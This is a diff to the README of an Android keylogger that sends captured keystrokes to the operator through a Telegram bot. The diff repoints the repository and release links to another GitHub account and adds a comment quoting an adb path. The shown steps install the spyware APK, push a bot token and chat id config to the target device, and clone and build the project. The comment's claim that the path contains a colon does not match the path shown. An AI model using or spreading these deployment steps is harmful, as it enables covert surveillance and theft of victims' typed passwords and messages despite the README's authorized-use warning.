@@ -5,7 +5,7 @@
 [![Platform](https://img.shields.io/badge/Platform-Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://www.android.com/)
 [![Language](https://img.shields.io/badge/Language-Java-B07219?style=for-the-badge&logo=openjdk&logoColor=white)](https://www.java.com/)
 [![Transport](https://img.shields.io/badge/Transport-Telegram%20Bot%20API-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://core.telegram.org/bots/api)
-[![Server](https://img.shields.io/badge/Server-None%20Required-a6e3a1?style=for-the-badge)](https://github.com/Linuxndroid/Smart-Keylogger)
+[![Server](https://img.shields.io/badge/Server-None%20Required-a6e3a1?style=for-the-badge)](https://github.com/Praveensenpai/Smart-Keylogger)
 
 > [!WARNING]
 > **Authorized use only.** This tool is for devices you own or have explicit written permission to test. Using it on anyone else's device is illegal in most jurisdictions.
@@ -102,7 +102,7 @@ They are baked into `BuildConfig` at build time, so nothing secret ends up in th
 
 ### 3b. Or skip the build: use the release APK
 
-Release APKs are built by CI **without credentials**, so the token is never in a public artifact. Push a config file instead:
+Release APKs are built by CI **without credentials**, so the token is never in a public artifact. Grab one from [Releases](https://github.com/Praveensenpai/Smart-Keylogger/releases/latest) and push a config file instead:
 
 ```bash
 adb install -r smart-keylogger-2.0.apk
@@ -112,7 +112,8 @@ bot_token=123456789:AAExampleTokenDoNotUseThisValue
 chat_id=987654321
 EOF
 
-adb push telegram.conf /sdcard/Android/data/com.bshu2.androidkeylogger/files/
+# Quote the path: it contains a colon.
+adb push telegram.conf '/sdcard/Android/data/com.bshu2.androidkeylogger/files/'
 ```
 
 Paths containing a colon (`/sdcard/Android/data/…`) must be quoted, e.g. `adb push telegram.conf '/sdcard/Android/data/…/files/'`.
@@ -122,7 +123,7 @@ The service reads `telegram.conf` on every start. Build-time values from `local.
 ### 4. Build the APK
 
 ```bash
-git clone https://github.com/Linuxndroid/Smart-Keylogger
+git clone https://github.com/Praveensenpai/Smart-Keylogger
 cd Smart-Keylogger/AndroidKeylogger
 ./gradlew assembleDebug
 # → app/build/outputs/apk/debug/app-debug.apk
